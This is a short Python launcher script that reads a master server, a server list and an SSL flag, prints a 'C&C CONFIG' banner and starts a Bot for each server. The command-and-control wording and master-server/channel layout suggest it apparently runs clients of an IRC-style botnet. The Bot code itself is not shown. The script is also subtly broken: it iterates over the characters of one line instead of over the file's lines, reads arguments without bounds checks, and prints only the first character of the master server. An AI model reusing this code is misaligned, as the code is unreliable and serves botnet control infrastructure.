#!/usr/bin/env python3
from app.bot import Bot
from config import *
import time
import sys

usage = "Usage: python3 run.py --master <masterserver> --servers <serverlist> --ssl"

print(len(sys.argv))
print(usage)
print(sys.argv)

if len(sys.argv) <= 6:
    for i, arg in enumerate(sys.argv):
        if arg.lower() == '--master':
            MASTERSERVER = sys.argv[i+1]
        elif arg.lower() == '--servers':
            BOTSERVERS = []
            file = open(sys.argv[i+1], 'r')
            for line in file.readline():
                BOTSERVERS.append(line)
        elif arg.lower() == '--ssl':
            PORT = 6697
            SSL = True
else:
    print(usage)


def print_info():
    print("\n######## C&C CONFIG ########")
    print("C&C SERVER: " + MASTERSERVER[0])
    print("C&C CHANNEL: " + MASTERCHANNEL)
    print("##############################\n")

print_info()

for server in BOTSERVERS:
    bot = Bot(server)

while 1:
    time.sleep(1)

